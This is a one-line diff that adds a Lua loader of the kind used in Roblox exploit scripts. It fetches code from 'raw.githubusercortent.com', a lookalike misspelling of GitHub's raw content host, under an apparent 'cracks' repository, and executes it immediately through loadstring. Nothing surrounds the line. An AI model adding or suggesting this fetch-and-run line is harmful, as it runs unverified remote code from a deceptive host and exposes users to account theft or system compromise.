@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/cracklua/cracks/m/neuron"))()
